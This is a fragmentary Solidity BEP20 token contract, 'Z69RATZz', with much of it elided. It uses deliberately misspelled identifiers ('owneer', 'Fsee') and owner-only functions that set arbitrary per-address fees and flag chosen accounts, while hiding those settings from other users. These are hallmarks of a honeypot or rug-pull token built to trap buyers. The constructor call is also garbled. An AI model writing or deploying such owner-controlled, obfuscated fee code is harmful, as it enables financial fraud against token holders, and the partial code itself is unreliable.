...
abstract contract Ownable is Context {
    address private _owneer;    

    event owneershipTransferred(address indexed previousowneer, address indexed newowneer);

    /**
     * @dev Initializes the contract setting the deployer as the initial owneer.
     */
    constructor() {
        _transferowneershiptransferowneership(_msgSender());
    }
...
contract BEP20 is Context {
    ...
    function approve(address spender, uint256 Amount) public virtual returns (bool) {
        ...
        _approve(owneer, spender, Amount);
        return true;
    }
    ...
    /**
     * @dev Sets `Amount` as the allowance of `spender` over the `owneer` s tokens.
     *
    ...
    function _approve(
        ...
        _allowances[owneer][spender] = Amount;
        emit Approval(owneer, spender, Amount);
    }

    /**
     * @dev Spend `Amount` form the allowance of `owneer` toward `spender`.
     *
    ...
    function _spendAllowance(
        ...
        if (currentAllowance != type(uint256).max) {
            ...
            unchecked {
                _approve(owneer, spender, currentAllowance - Amount);
            }
        }
    }
...
contract Z69RATZz  is BEP20, Ownable {
    // ext
    ...
    function SetPairList(address _address) external onlyowneer {
    ...
    function setSlipFsee(address _address, uint256 _value) external onlyowneer {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipFsee[_address] = _value;
    }

    function getSlipFsee(address _address) external view onlyowneer returns (uint256) {
        return _slipFsee[_address];
    }


    function setMAccountFsee(address _address, bool _value) external onlyowneer {
        _mAccount[_address] = _value;
    }

    function getMAccountFsee(address _address) external view onlyowneer returns (bool) {
